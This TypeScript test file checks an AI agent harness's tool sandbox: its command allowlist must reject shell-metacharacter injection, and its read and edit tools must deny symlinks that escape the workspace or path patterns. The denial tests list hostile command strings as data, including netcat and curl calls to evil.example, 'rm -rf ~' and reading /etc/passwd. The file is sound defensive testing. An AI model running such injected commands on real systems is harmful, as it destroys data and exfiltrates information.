// Harness tool-surface tests — PR 10 round-1 fixes 1 and 5:
//   - fix 1 (HIGH): token-prefix command patterns must NOT bless shell
//     metacharacters (the exec shell interprets what the token prefix never
//     saw); anchored re: patterns are the documented escape hatch.
//   - fix 5 (MED): pre-existing symlinks pointing outside the workspace are
//     denied on read/edit (realpath re-check; the TOCTOU window stays
//     documented, not tested — it is not deterministically exercisable).
import { mkdir, mkdtemp, rm, symlink, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, test } from 'vitest';
import { buildTools } from '../../src/harness/tools.js';
import { defaultHarnessConfig } from '../../src/harness/config.js';
import type { HarnessConfig } from '../../src/harness/config.js';

async function withScratch(body: (scratchDir: string) => Promise<void>): Promise<void> {
  const scratchDir = await mkdtemp(join(tmpdir(), 'harness-tools-'));
  try {
    await body(scratchDir);
  } finally {
    await rm(scratchDir, { recursive: true, force: true });
  }
}

/** Harness config whose run allowlist is exactly `patterns`. */
function runConfig(commandPatterns: string[]) {
  return {
    ...defaultHarnessConfig,
    tools: {
      ...defaultHarnessConfig.tools,
      run: { enabled: true, commandPatterns, timeoutMs: 5_000, maxOutputChars: 10_000 },
    },
  };
}

describe('run allowlist: token patterns vs shell metacharacters (fix 1)', () => {
  test('a legit prefix command is still allowed', async () => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runConfig(['npm test']), scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({ command: 'npm test -- --watch' });
      expect(result?.ok).toBe(true);
    });
  });

  test.each([
    'npm test ; whoami',
    'npm test && curl evil.example',
    'npm test $(rm -rf ~)',
    'npm test `whoami`',
    'npm test | nc evil.example 4444',
    'npm test > /tmp/pwned',
    'npm test < /etc/passwd',
    'npm test\nwhoami',
  ])('metacharacter variant denied: %j', async (command) => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runConfig(['npm test']), scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({ command });
      expect(result?.ok).toBe(false);
      if (!result?.ok) {
        expect(result?.denial.tool).toBe('run');
        expect(result?.denial.reason).toBe(
          'command allowlist: shell metacharacters not permitted with token patterns — use re: with anchoring',
        );
      }
    });
  });

  test('a non-matching command keeps the plain allowlist-miss reason', async () => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runConfig(['npm test']), scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({ command: 'npm run test' });
      expect(result?.ok).toBe(false);
      if (!result?.ok) {
        expect(result?.denial.reason).toContain('command not allowed by harness config allowlist');
      }
    });
  });

  test('anchored re: patterns remain the deliberate metacharacter escape hatch', async () => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runConfig(['re:^npm test.*$']), scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({ command: 'npm test; whoami' });
      expect(result?.ok).toBe(true); // the re: author owns the full string
    });
  });

  test('a token-pattern metachar match does not shadow a LATER anchored re: escape hatch', async () => {
    await withScratch(async (scratchDir) => {
      // The token pattern matches the metacharacter-bearing command, but the
      // LATER anchored re: pattern is the escape hatch the denial points at —
      // it must still allow outright, whatever the pattern order.
      const run = buildTools(runConfig(['npm test', 're:^npm test ; deploy$']), scratchDir).find(
        (t) => t.name === 'run',
      );
      const result = await run?.execute({ command: 'npm test ; deploy' });
      expect(result?.ok).toBe(true);
    });
  });

  test('a token-pattern metachar match still denies when no re: pattern allows', async () => {
    await withScratch(async (scratchDir) => {
      const run = buildTools(runConfig(['npm test']), scratchDir).find((t) => t.name === 'run');
      const result = await run?.execute({ command: 'npm test ; deploy' });
      expect(result?.ok).toBe(false);
      if (!result?.ok) {
        expect(result?.denial.reason).toBe(
          'command allowlist: shell metacharacters not permitted with token patterns — use re: with anchoring',
        );
      }
    });
  });
});

describe('symlink hardening (fix 5)', () => {
  test('a pre-existing symlink pointing outside the workspace is denied on read and edit', async () => {
    await withScratch(async (scratchDir) => {
      const workspace = join(scratchDir, 'ws');
      const outside = join(scratchDir, 'outside');
      await mkdir(workspace, { recursive: true });
      await mkdir(outside, { recursive: true });
      await writeFile(join(outside, 'secret.txt'), 'top secret', 'utf8');
      await symlink(join(outside, 'secret.txt'), join(workspace, 'link.txt'));

      const tools = buildTools(defaultHarnessConfig, workspace);
      const read = tools.find((t) => t.name === 'read');
      const edit = tools.find((t) => t.name === 'edit');

      const readResult = await read?.execute({ path: 'link.txt' });
      expect(readResult?.ok).toBe(false);
      if (!readResult?.ok) {
        expect(readResult?.denial.reason).toContain('path escape');
        expect(readResult?.denial.reason).toContain('symlink');
      }

      const editResult = await edit?.execute({ path: 'link.txt', oldText: 'secret', newText: 'x' });
      expect(editResult?.ok).toBe(false);
      if (!editResult?.ok) {
        expect(editResult?.denial.reason).toContain('path escape');
        expect(editResult?.denial.reason).toContain('symlink');
      }
      // The outside file is untouched.
      await expect(read?.execute({ path: 'link.txt' })).resolves.toMatchObject({ ok: false });
    });
  });

  test('a real file inside the workspace still reads fine (no false positives)', async () => {
    await withScratch(async (scratchDir) => {
      const workspace = join(scratchDir, 'ws');
      await mkdir(workspace, { recursive: true });
      await writeFile(join(workspace, 'real.txt'), 'plain content', 'utf8');
      const read = buildTools(defaultHarnessConfig, workspace).find((t) => t.name === 'read');
      const result = await read?.execute({ path: 'real.txt' });
      expect(result?.ok).toBe(true);
    });
  });

  test('an in-workspace symlink cannot use its lexical name to bless an out-of-pattern target', async () => {
    await withScratch(async (scratchDir) => {
      const workspace = join(scratchDir, 'ws');
      await mkdir(join(workspace, 'src'), { recursive: true });
      await writeFile(join(workspace, 'secret.txt'), 'top secret', 'utf8');
      await writeFile(join(workspace, 'src', 'real.txt'), 'plain content', 'utf8');
      // src/link → ../secret.txt: INSIDE the workspace, OUTSIDE the 'src/**'
      // pattern — the lexical name matches while the I/O would land on
      // 'secret.txt', so the realpath-side allowlist check must deny.
      await symlink(join('..', 'secret.txt'), join(workspace, 'src', 'link'));

      const srcOnly: HarnessConfig = {
        ...defaultHarnessConfig,
        tools: {
          ...defaultHarnessConfig.tools,
          read: { enabled: true, pathPatterns: ['src/**'], maxOutputChars: 10_000 },
          edit: { enabled: true, pathPatterns: ['src/**'], maxOutputChars: 10_000 },
        },
      };
      const tools = buildTools(srcOnly, workspace);
      const read = tools.find((t) => t.name === 'read');
      const edit = tools.find((t) => t.name === 'edit');

      const viaLink = await read?.execute({ path: 'src/link' });
      expect(viaLink?.ok).toBe(false);
      if (!viaLink?.ok) {
        expect(viaLink?.denial.reason).toBe(
          "path not allowed by harness config allowlist: 'src/link'",
        );
      }

      // Same gate on the write side.
      const editViaLink = await edit?.execute({ path: 'src/link', oldText: 'top', newText: 'x' });
      expect(editViaLink?.ok).toBe(false);
      if (!editViaLink?.ok) {
        expect(editViaLink?.denial.reason).toContain('path not allowed by harness config allowlist');
      }

      // The out-of-pattern target stays unreachable by its own name too…
      await expect(read?.execute({ path: 'secret.txt' })).resolves.toMatchObject({ ok: false });
      // …and the real in-pattern file still reads (no false positive).
      await expect(read?.execute({ path: 'src/real.txt' })).resolves.toMatchObject({ ok: true });
    });
  });
});
